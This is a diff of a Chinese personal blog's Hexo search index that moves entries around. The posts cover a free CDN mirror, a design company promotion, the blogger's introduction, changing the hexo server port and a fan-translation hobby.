@@ -1,6 +1,69 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ADN公益CDN项目体验——完美替代elemecdn</title>
+    <url>/posts/adn/</url>
+    <content><![CDATA[<p>前一段时间分享了将静态资源发布到npm的方法<del>，其实主要是因为那时可以白嫖elemecdn</del>。然而前一段时间elemecdn已经关闭回源，部分文件已经无法访问。其源站unpkg在中国大陆的访问并不理想，而jsdelivr在前一段时间也遭受过一次DNS污染，无法确保其稳定性。此时，<a href="https://arcitcgn.cn/"></a><a href="https://arcitcgn.cn/">Arcitcgn</a>告知我，他反向代理了<code>cdn.jsdelivr.net/npm</code>。经过大量测试发现在中国境内各区域的访问速度都十分可观，<a href="https://arcitcgn.cn/">Arcitcgn</a>决定上线ADN公益项目。</p>
+<div class="story post-story"><h2 id="ADN项目使用方法"><a href="#ADN项目使用方法" class="headerlink" title="ADN项目使用方法"></a>ADN项目使用方法</h2><p>使用方法：用<code>adn.arcitcgn.cn/npm</code>替换<code>cdn.jsdelivr.net/npm</code><br>形如：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://adn.arcitcgn.cn/npm/包名@版本号/路径+文件名</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+</div><div class="story post-story"><h2 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h2><p>在和项目作者<a href="https://arcitcgn.cn/">Arcitcgn</a>的交流过程中，我了解到该项目在国内同时接入了腾讯云、百度云、又拍云加速，因此在国内拥有不错的速度。当然，项目也仅在国内提供服务。项目详情可以阅读项目作者的文章：</p>
+<div class="tag link"><a class="link-card" title="ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案" href="https://arcitcgn.cn/171.html"><div class="left"><img src="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案</p><p class="url">https://arcitcgn.cn/171.html</p></div></a></div>
+
+<p>大家可以自行测试项目速度和稳定性。以我的博客为例，放两张对比图直观感受一下速度：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" data-fancybox="default" data-caption="使用unpkg"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用unpkg"></a><span class="image-caption">使用unpkg</span></div></div>
+
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" data-fancybox="default" data-caption="使用ADN"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用ADN"></a><span class="image-caption">使用ADN</span></div></div>
+
+<p>这两次打开网站都是在清除浏览器缓存后执行的，可以看到使用ADN比使用unpkg的速度快了7秒多。对于一个网站来说，首次打开速度减少7秒给访客带来的体验的提升是非同小可的。</p>
+</div><div class="story post-story"><h2 id="推荐原因"><a href="#推荐原因" class="headerlink" title="推荐原因"></a>推荐原因</h2><p>从入坑个人博客开始，网站加载速度的优化一直困扰着我。ADN项目提供的免费CDN服务对于个人博主来说，是一个可靠、便捷、零成本的提升网站加载速度的途径。项目的作者有能力也有毅力将项目维护下去，相信项目能够越做越好！</p>
+</div><div class="story post-story"><h2 id="参与维护"><a href="#参与维护" class="headerlink" title="参与维护"></a>参与维护</h2><p>由于诸多原因，我已经加入了ADN的团队，参与ADN项目的维护。公益项目毕竟难做，希望大家仔细阅读<a href="https://arcitcgn.cn/">Arcitcgn</a>的文章</p>
+<div class="tag link"><a class="link-card" title="ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案" href="https://arcitcgn.cn/171.html"><div class="left"><img src="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案</p><p class="url">https://arcitcgn.cn/171.html</p></div></a></div>
+
+<p>并遵守相应协议，请不要滥用资源，公益项目需要大家共同创造良好的环境。如果您想要支持ADN项目，可以通过侧边栏的ADN项目赞助通道进行赞助！感谢大家的支持与合作！</p>
+
+</div>]]></content>
+      <categories>
+        <category>分享</category>
+      </categories>
+      <tags>
+        <tag>公益项目</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初柒科技：致力于设计与开发</title>
+    <url>/posts/chuqi/</url>
+    <content><![CDATA[<p>最近听闻博友创业，开展了为博主<strong>免费设计Logo</strong>的活动。就我个人而言，我十分敬佩勇于创业的精神。本着尽我所能为博友宣传<del>顺便piao个Logo</del>的想法，写下这篇短文。<span id="more"></span></p>
+<div class="story post-story"><h2 id="公司介绍"><a href="#公司介绍" class="headerlink" title="公司介绍"></a>公司介绍</h2><p> 武汉初柒网络科技有限公司是一家集<strong>互联网开发、网络运营 、网站建设、平面设计、小程序及APP开发服务、公司互联网服务</strong>于一体的网络科技公司。作为一家年轻公司，初柒科技注重<strong>创新</strong>、<strong>企业文化</strong>的塑造以及更高品质的<strong>服务</strong>。</p>
+</div><div class="story post-story"><h2 id="团队介绍"><a href="#团队介绍" class="headerlink" title="团队介绍"></a>团队介绍</h2><div class="timeline">
+<div class="timenode"><div class="meta"><p></p><p>2021年7月</p>
+<p></p></div><div class="body"><p>初柒科技前身“拾小染网络科技”公司正式成立20人工作室小组</p></div></div>
+
+<div class="timenode"><div class="meta"><p></p><p>2021年9月</p>
+<p></p></div><div class="body"><p>“锦词”项目与云跃星灿科技达成战略合作</p></div></div>
+
+<div class="timenode"><div class="meta"><p></p><p>2021年~2022年</p>
+<p></p></div><div class="body"><p>向高新技术企业发展</p></div></div>
+</div>
+
+<p>最开始了解到这家公司，是因为“与时同行”项目。这是一个致力于个人博客互联的项目，无论是<strong>项目理念</strong>还是<strong>网页设计</strong>都彰显了这家年轻公司的活力与能力。</p>
+<p><img src="https://oc.arcitcgn.cn/2022/07/16/62d20d4104dd0.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/16/62d20d4104dd0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="与时同行"></p>
+</div><div class="story post-story"><h2 id="最新活动介绍"><a href="#最新活动介绍" class="headerlink" title="最新活动介绍"></a>最新活动介绍</h2><div class="tag link"><a class="link-card" title="初柒科技 || “扬帆起航”LOGO设计活动" href="https://www.8b9.cn/105/"><div class="left"><img src="https://www.8b9.cn/wp-content/uploads/2022/07/cc35d4b8e7232610.png" class="lazyload" data-srcset="https://www.8b9.cn/wp-content/uploads/2022/07/cc35d4b8e7232610.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">初柒科技 || “扬帆起航”LOGO设计活动</p><p class="url">https://www.8b9.cn/105/</p></div></a></div>
+<p>博主的Logo正由初柒科技设计中，在此表示感谢！</p>
+</div><div class="story post-story"><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><img src="https://oc.arcitcgn.cn/2022/07/16/62d20f37d520c.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/16/62d20f37d520c.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="初柒科技公众号"></p>
+<p>希望各位博主能够多多支持！</p>
+
+</div>]]></content>
+      <categories>
+        <category>分享</category>
+      </categories>
+      <tags>
+        <tag>杂七杂八</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>利用GitHub Action自动发布你的静态资源到npm</title>
     <url>/posts/action-npm/</url>
     <content><![CDATA[<p>苦于GitHub Page和Vercel的本地资源加载速度，我和<a href="https://felixchen0707.cn/">Felix</a>一直在寻找各种静态资源的公共CDN。然而这些资源并不能很好满足我们的需求，因此想到利用npm包在国内的镜像来作为我们所需静态资源的CDN。我们同时想将这些静态资源托管在GitHub并发布到npm，这样一来手动操作就效率极低。<span id="more"></span>懒，也就成了这篇文章的第一驱动力。</p>
@@ -92,38 +155,6 @@
         <tag>npm</tag>
         <tag>GitHub</tag>
         <tag>Action</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ADN公益CDN项目体验——完美替代elemecdn</title>
-    <url>/posts/adn/</url>
-    <content><![CDATA[<p>前一段时间分享了将静态资源发布到npm的方法<del>，其实主要是因为那时可以白嫖elemecdn</del>。然而前一段时间elemecdn已经关闭回源，部分文件已经无法访问。其源站unpkg在中国大陆的访问并不理想，而jsdelivr在前一段时间也遭受过一次DNS污染，无法确保其稳定性。此时，<a href="https://arcitcgn.cn/"></a><a href="https://arcitcgn.cn/">Arcitcgn</a>告知我，他反向代理了<code>cdn.jsdelivr.net/npm</code>。经过大量测试发现在中国境内各区域的访问速度都十分可观，<a href="https://arcitcgn.cn/">Arcitcgn</a>决定上线ADN公益项目。</p>
-<div class="story post-story"><h2 id="ADN项目使用方法"><a href="#ADN项目使用方法" class="headerlink" title="ADN项目使用方法"></a>ADN项目使用方法</h2><p>使用方法：用<code>adn.arcitcgn.cn/npm</code>替换<code>cdn.jsdelivr.net/npm</code><br>形如：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://adn.arcitcgn.cn/npm/包名@版本号/路径+文件名</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-</div><div class="story post-story"><h2 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h2><p>在和项目作者<a href="https://arcitcgn.cn/">Arcitcgn</a>的交流过程中，我了解到该项目在国内同时接入了腾讯云、百度云、又拍云加速，因此在国内拥有不错的速度。当然，项目也仅在国内提供服务。项目详情可以阅读项目作者的文章：</p>
-<div class="tag link"><a class="link-card" title="ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案" href="https://arcitcgn.cn/171.html"><div class="left"><img src="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案</p><p class="url">https://arcitcgn.cn/171.html</p></div></a></div>
-
-<p>大家可以自行测试项目速度和稳定性。以我的博客为例，放两张对比图直观感受一下速度：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" data-fancybox="default" data-caption="使用unpkg"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用unpkg"></a><span class="image-caption">使用unpkg</span></div></div>
-
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" data-fancybox="default" data-caption="使用ADN"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用ADN"></a><span class="image-caption">使用ADN</span></div></div>
-
-<p>这两次打开网站都是在清除浏览器缓存后执行的，可以看到使用ADN比使用unpkg的速度快了7秒多。对于一个网站来说，首次打开速度减少7秒给访客带来的体验的提升是非同小可的。</p>
-</div><div class="story post-story"><h2 id="推荐原因"><a href="#推荐原因" class="headerlink" title="推荐原因"></a>推荐原因</h2><p>从入坑个人博客开始，网站加载速度的优化一直困扰着我。ADN项目提供的免费CDN服务对于个人博主来说，是一个可靠、便捷、零成本的提升网站加载速度的途径。项目的作者有能力也有毅力将项目维护下去，相信项目能够越做越好！</p>
-</div><div class="story post-story"><h2 id="参与维护"><a href="#参与维护" class="headerlink" title="参与维护"></a>参与维护</h2><p>由于诸多原因，我已经加入了ADN的团队，参与ADN项目的维护。公益项目毕竟难做，希望大家仔细阅读<a href="https://arcitcgn.cn/">Arcitcgn</a>的文章</p>
-<div class="tag link"><a class="link-card" title="ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案" href="https://arcitcgn.cn/171.html"><div class="left"><img src="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案</p><p class="url">https://arcitcgn.cn/171.html</p></div></a></div>
-
-<p>并遵守相应协议，请不要滥用资源，公益项目需要大家共同创造良好的环境。如果您想要支持ADN项目，可以通过侧边栏的ADN项目赞助通道进行赞助！感谢大家的支持与合作！</p>
-
-</div>]]></content>
-      <categories>
-        <category>分享</category>
-      </categories>
-      <tags>
-        <tag>公益项目</tag>
       </tags>
   </entry>
   <entry>
@@ -358,73 +389,6 @@
       <tags>
         <tag>CSAPP</tag>
         <tag>系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初柒科技：致力于设计与开发</title>
-    <url>/posts/chuqi/</url>
-    <content><![CDATA[<p>最近听闻博友创业，开展了为博主<strong>免费设计Logo</strong>的活动。就我个人而言，我十分敬佩勇于创业的精神。本着尽我所能为博友宣传<del>顺便piao个Logo</del>的想法，写下这篇短文。<span id="more"></span></p>
-<div class="story post-story"><h2 id="公司介绍"><a href="#公司介绍" class="headerlink" title="公司介绍"></a>公司介绍</h2><p> 武汉初柒网络科技有限公司是一家集<strong>互联网开发、网络运营 、网站建设、平面设计、小程序及APP开发服务、公司互联网服务</strong>于一体的网络科技公司。作为一家年轻公司，初柒科技注重<strong>创新</strong>、<strong>企业文化</strong>的塑造以及更高品质的<strong>服务</strong>。</p>
-</div><div class="story post-story"><h2 id="团队介绍"><a href="#团队介绍" class="headerlink" title="团队介绍"></a>团队介绍</h2><div class="timeline">
-<div class="timenode"><div class="meta"><p></p><p>2021年7月</p>
-<p></p></div><div class="body"><p>初柒科技前身“拾小染网络科技”公司正式成立20人工作室小组</p></div></div>
-
-<div class="timenode"><div class="meta"><p></p><p>2021年9月</p>
-<p></p></div><div class="body"><p>“锦词”项目与云跃星灿科技达成战略合作</p></div></div>
-
-<div class="timenode"><div class="meta"><p></p><p>2021年~2022年</p>
-<p></p></div><div class="body"><p>向高新技术企业发展</p></div></div>
-</div>
-
-<p>最开始了解到这家公司，是因为“与时同行”项目。这是一个致力于个人博客互联的项目，无论是<strong>项目理念</strong>还是<strong>网页设计</strong>都彰显了这家年轻公司的活力与能力。</p>
-<p><img src="https://oc.arcitcgn.cn/2022/07/16/62d20d4104dd0.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/16/62d20d4104dd0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="与时同行"></p>
-</div><div class="story post-story"><h2 id="最新活动介绍"><a href="#最新活动介绍" class="headerlink" title="最新活动介绍"></a>最新活动介绍</h2><div class="tag link"><a class="link-card" title="初柒科技 || “扬帆起航”LOGO设计活动" href="https://www.8b9.cn/105/"><div class="left"><img src="https://www.8b9.cn/wp-content/uploads/2022/07/cc35d4b8e7232610.png" class="lazyload" data-srcset="https://www.8b9.cn/wp-content/uploads/2022/07/cc35d4b8e7232610.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">初柒科技 || “扬帆起航”LOGO设计活动</p><p class="url">https://www.8b9.cn/105/</p></div></a></div>
-<p>博主的Logo正由初柒科技设计中，在此表示感谢！</p>
-</div><div class="story post-story"><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><img src="https://oc.arcitcgn.cn/2022/07/16/62d20f37d520c.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/16/62d20f37d520c.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="初柒科技公众号"></p>
-<p>希望各位博主能够多多支持！</p>
-
-</div>]]></content>
-      <categories>
-        <category>分享</category>
-      </categories>
-      <tags>
-        <tag>杂七杂八</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初来乍到，请多指教！</title>
-    <url>/posts/firstblog/</url>
-    <content><![CDATA[<h1 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h1><span id="more"></span>
-
-<center>我是一名普通大学生、极客爱好者。</center>
-
-<center>是NBA和F1的狂热粉丝。</center>
-
-<center>白日梦是成为一名优秀的（白帽）hacker。</center>
-
-<center>我将在这个网页上更新我的学习经历、生活等。</center>
-
-<center>请多多指教！</center>
-
-<h1 id="为什么搭建这样一个博客？"><a href="#为什么搭建这样一个博客？" class="headerlink" title="为什么搭建这样一个博客？"></a>为什么搭建这样一个博客？</h1><ul>
-<li><p>其实最直接的原因是最近在<a href="https://www.w3school.com.cn/">w3school</a>)学html+css，又偶然间在油管上刷到了利用<a href="https://hexo.io/">hexo</a>和<a href="https://github.com/">github</a>搭建个人博客的视频，脑子一热，就花了一段时间搭建了这个网站。</p>
-</li>
-<li><p>还有一个原因就是为了<del>装杯</del>，毕竟听说学IT的人总归要有个个人博客。<del>技术不行那就先拿博客凑个数</del></p>
-</li>
-<li><p>然后呢就是为了有一个渠道去分享我的一些学习经验和生活吧。更新随缘。</p>
-</li>
-</ul>
-<h1 id="如何联系我"><a href="#如何联系我" class="headerlink" title="如何联系我"></a>如何联系我</h1><ul>
-<li><p><a href="mailto:yys958257943@gamil.com">谷歌邮箱</a></p>
-</li>
-<li><p><a href="https://github.com/BowenYoung">Github主页</a></p>
-</li>
-</ul>
-<p>欢迎所有访客的友好交流和建议哦！</p>
-
-]]></content>
-      <tags>
-        <tag>杂七杂八</tag>
       </tags>
   </entry>
   <entry>
@@ -690,6 +654,42 @@
       </tags>
   </entry>
   <entry>
+    <title>初来乍到，请多指教！</title>
+    <url>/posts/firstblog/</url>
+    <content><![CDATA[<h1 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h1><span id="more"></span>
+
+<center>我是一名普通大学生、极客爱好者。</center>
+
+<center>是NBA和F1的狂热粉丝。</center>
+
+<center>白日梦是成为一名优秀的（白帽）hacker。</center>
+
+<center>我将在这个网页上更新我的学习经历、生活等。</center>
+
+<center>请多多指教！</center>
+
+<h1 id="为什么搭建这样一个博客？"><a href="#为什么搭建这样一个博客？" class="headerlink" title="为什么搭建这样一个博客？"></a>为什么搭建这样一个博客？</h1><ul>
+<li><p>其实最直接的原因是最近在<a href="https://www.w3school.com.cn/">w3school</a>)学html+css，又偶然间在油管上刷到了利用<a href="https://hexo.io/">hexo</a>和<a href="https://github.com/">github</a>搭建个人博客的视频，脑子一热，就花了一段时间搭建了这个网站。</p>
+</li>
+<li><p>还有一个原因就是为了<del>装杯</del>，毕竟听说学IT的人总归要有个个人博客。<del>技术不行那就先拿博客凑个数</del></p>
+</li>
+<li><p>然后呢就是为了有一个渠道去分享我的一些学习经验和生活吧。更新随缘。</p>
+</li>
+</ul>
+<h1 id="如何联系我"><a href="#如何联系我" class="headerlink" title="如何联系我"></a>如何联系我</h1><ul>
+<li><p><a href="mailto:yys958257943@gamil.com">谷歌邮箱</a></p>
+</li>
+<li><p><a href="https://github.com/BowenYoung">Github主页</a></p>
+</li>
+</ul>
+<p>欢迎所有访客的友好交流和建议哦！</p>
+
+]]></content>
+      <tags>
+        <tag>杂七杂八</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GitHub个人资料页美化</title>
     <url>/posts/githubBeautify/</url>
     <content><![CDATA[<p>本文介绍如何美化GitHub个人资料页</p>
@@ -794,6 +794,29 @@
       </categories>
       <tags>
         <tag>GitHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo本地服务器更换端口</title>
+    <url>/posts/port/</url>
+    <content><![CDATA[<p>hexo使用<code>hexo s</code>命令会启动本地服务器用以预览博客网页效果。默认启用的端口为4000，但有时可能因为其他进程占用4000端口导致localhost:4000无响应。<span id="more"></span>官方给出的解决办法是，每次运行服务器时输入下列代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo server -p 5000</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当然也可以简写成：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo s -p 5000</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这样将指定启用5000端口。但这样做仅仅指定这一次打开5000端口，下次仍然会打开默认4000端口。下面介绍一个一劳永逸的方法：打开博客根目录下<code>_config.yml</code>文件，在文件的最后添加以下代码：</p>
+<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">5000</span></span><br><span class="line">  <span class="attr">compress:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">header:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>当然，可以将port: 后的数值修改成0-65535之间的任意端口（前提是没有被占用）</p>
+<p>（对的，就是在水一篇博文）</p>
+
+]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -917,26 +940,26 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo本地服务器更换端口</title>
-    <url>/posts/port/</url>
-    <content><![CDATA[<p>hexo使用<code>hexo s</code>命令会启动本地服务器用以预览博客网页效果。默认启用的端口为4000，但有时可能因为其他进程占用4000端口导致localhost:4000无响应。<span id="more"></span>官方给出的解决办法是，每次运行服务器时输入下列代码：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo server -p 5000</span><br></pre></td></tr></tbody></table></figure>
+    <title>记录第一次参与美漫翻译</title>
+    <url>/posts/sp-translate/</url>
+    <content><![CDATA[<p>有点小兴奋。我终于也成了一名”烤肉man”。以前看美剧、美漫的时候片头字幕组给我的感觉就是：帅爆了。试想一下，你将自己喜欢看的剧翻译成中文，你的同好看的某一集就是你翻译的——SO DAMN COOL!<span id="more"></span></p>
+<div class="story post-story"><h2 id="关于我看美漫这件事"><a href="#关于我看美漫这件事" class="headerlink" title="关于我看美漫这件事"></a>关于我看美漫这件事</h2><p>虽然我的头像是炭治郎，但其实我平时看日漫真不多，我近几年看过的日漫简直屈指可数：《鬼灭之刃》、《咒术回战》，《国王排名》甚至只看了一点点。倒是看美漫看得还比较多<del>，只不过没多少能拿来当头像的</del>。能拿到台面上来说的有：<em>Rick and Morty</em>, <em>Gravity Falls</em>, <em>Love,Death&amp;Robots</em>。剩下的就不多说了<del>，如果有美漫同好也可以私我</del>。反正对我来说，看日漫是因为热血，看美漫是因为脑洞。可能喜欢看美漫是因为它能让我从固化的思维当中暂时抽离出来吧！</p>
+</div><div class="story post-story"><h2 id="烤肉的起因"><a href="#烤肉的起因" class="headerlink" title="烤肉的起因"></a>烤肉的起因</h2><p>向看国外片子少的小伙伴们解释下，一般称没有翻译的外语片为生肉，有中文字幕的则叫做熟肉，而翻译过程就叫做烤肉。这件事的起因是我的一个好兄弟找到了这部动漫中文字幕组的账号，看到了他们发布的招新信息，他就加入了。后来他告诉我翻译工作频率很低、随缘，而且翻译测试很简单，我就跟着冲了。（果然easy，毕竟招新要求是初三以上即可 XD）</p>
+</div><div class="story post-story"><h2 id="烤肉的经过"><a href="#烤肉的经过" class="headerlink" title="烤肉的经过"></a>烤肉的经过</h2><p>严格来说，我做的并不能算烤肉的工作。这部动漫联手育碧等公司发布了三款游戏：真理之杖、完整破碎、手机毁灭者（看过动漫或者玩过游戏的小伙伴想必已经知道我说的是哪部动漫了<img no-lazy="" class="inline" src="https://npm.elemecdn.com/sticker-heo/Sticker-100/%E8%A2%AB%E6%89%93.png" style="height:1.5em">），我翻译的是游戏演示视频，但我已经很满意了。</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/06/62c58258a4818.png" data-fancybox="default" data-caption="聊天记录"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/06/62c58258a4818.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/06/62c58258a4818.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="聊天记录"></a><span class="image-caption">聊天记录</span></div></div>
+<p>很多加群的新人都会问这样一个问题：“有ddl吗？”他们都会得到相同的有些意外的答案：“没有”。因为所有翻译全都是用爱发电、为爱发电。没有人会要求你完成多少翻译任务，没有人限定翻译时间；同样地，没有人会进群划水，也没有人领了任务迟迟不完成。另外，在烤肉的过程中，虽然有wiki可以参考，但是像这样一部梗满天飞的美漫仍旧是很难翻译的。有些梗可能十分冷门，因此翻译难度很大，但是没有谁会摆烂瞎翻。之前群里有一段关于某一缩写的含义的讨论，持续了好几天才得出结论。</p>
+</div><div class="story post-story"><h2 id="一些感受"><a href="#一些感受" class="headerlink" title="一些感受"></a>一些感受</h2><p>加入翻译组不仅让我结识了一群该动漫的同好，也让我的翻译能力有了大幅度的提升。毕竟在大学里我的英语全靠高中的功底强撑着，我是不太可能主动学习英语的。但是我的确喜欢翻译，这是一种将地道的外国表达转换成够味儿的中文表达的过程，是多元文化的碰撞。当然，毋宁说是这让我理解更多梗、让我有一种平日里少有的自豪感。</p>
+<p>其实这样的翻译工作跟博客创作倒是有些相似之处：一群同好聚集在一起做喜欢的事，充满热情和活力，一起讨论问题、解决问题、分享。当然，还有为爱发电。我认识的绝大多数博主创作博客的目的都不是为了盈利，毕竟做博客的盈利或许都很难比得上维护博客所耗费的时间、精力、财力。对了，对我来说这两个圈子还有一个共同点：那就是比我现在大学生活的圈子精彩得多。</p>
+<p>最后放一张我翻译的片段吧！</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/06/62c5883784a98.png" data-fancybox="default" data-caption="image-20220706210344922"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/06/62c5883784a98.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/06/62c5883784a98.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220706210344922"></a><span class="image-caption">image-20220706210344922</span></div></div>
+<p>这是我第一次烤肉，因此很多表达翻译成中文自己都感觉怪怪的，希望能继续进步吧！<del>还想参与下半年电影字幕的翻译呢嘿嘿</del></p>
 
-<p>当然也可以简写成：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo s -p 5000</span><br></pre></td></tr></tbody></table></figure>
-
-<p>这样将指定启用5000端口。但这样做仅仅指定这一次打开5000端口，下次仍然会打开默认4000端口。下面介绍一个一劳永逸的方法：打开博客根目录下<code>_config.yml</code>文件，在文件的最后添加以下代码：</p>
